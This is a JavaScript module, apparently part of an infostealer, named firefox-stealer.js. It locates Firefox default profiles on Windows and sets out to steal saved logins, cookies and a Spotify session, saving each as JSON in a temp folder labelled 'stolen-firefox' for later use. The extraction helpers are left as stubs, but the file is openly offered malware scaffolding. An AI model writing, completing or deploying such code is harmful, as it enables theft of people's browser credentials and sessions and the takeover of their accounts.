// firefox-stealer.js - Saves real data to disk + returns data
const os = require('os');
const fs = require('fs/promises');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { copyLockedFile } = require('./utils');

module.exports = async () => {
    try {
        console.log("[FIREFOX-STEALER] Starting Firefox data theft...");

        const tempDir = path.join(os.tmpdir(), 'stolen-firefox');
        await fs.mkdir(tempDir, { recursive: true });

        const found = [];
        const savedPaths = [];

        // Common Firefox profile locations
        const firefoxPaths = [
            path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
        ];

        for (const basePath of firefoxPaths) {
            if (!await fs.stat(basePath).catch(() => false)) continue;

            const profiles = await fs.readdir(basePath);
            const defaultProfiles = profiles.filter(p => p.includes('.default') || p.includes('default-release'));

            for (const profile of defaultProfiles) {
                const profilePath = path.join(basePath, profile);

                // Steal Logins
                const logins = await stealFirefoxLogins(profilePath);
                if (logins.length > 0) {
                    const loginPath = path.join(tempDir, `${profile}_logins.json`);
                    await fs.writeFile(loginPath, JSON.stringify(logins, null, 2));
                    savedPaths.push(loginPath);

                    found.push({
                        type: 'logins',
                        profile: profile,
                        count: logins.length,
                        savedAs: loginPath
                    });
                }

                // Steal Cookies
                const cookies = await stealFirefoxCookies(profilePath);
                if (cookies.length > 0) {
                    const cookiePath = path.join(tempDir, `${profile}_cookies.json`);
                    await fs.writeFile(cookiePath, JSON.stringify(cookies, null, 2));
                    savedPaths.push(cookiePath);

                    found.push({
                        type: 'cookies',
                        profile: profile,
                        count: cookies.length,
                        savedAs: cookiePath
                    });
                }

                // Spotify Session (if applicable)
                const spotifyPath = await stealSpotifySession(profilePath);
                if (spotifyPath) {
                    savedPaths.push(spotifyPath);
                    found.push({
                        type: 'spotify_session',
                        profile: profile,
                        savedAs: spotifyPath
                    });
                }
            }
        }

        console.log(`[+] Firefox stealer found ${found.length} items`);

        return {
            count: found.length,
            firefox: found,
            savedPaths: savedPaths
        };

    } catch (e) {
        console.log("[-] Firefox stealer error:", e.message);
        return {
            count: 0,
            firefox: [],
            savedPaths: [],
            error: e.message
        };
    }
};

// Helper functions (you need to keep or adapt these)
async function stealFirefoxLogins(profilePath) {
    // ... your existing logic for logins ...
    return [];
}

async function stealFirefoxCookies(profilePath) {
    // ... your existing logic for cookies ...
    return [];
}

async function stealSpotifySession(profilePath) {
    // ... your existing logic ...
    return null;
}

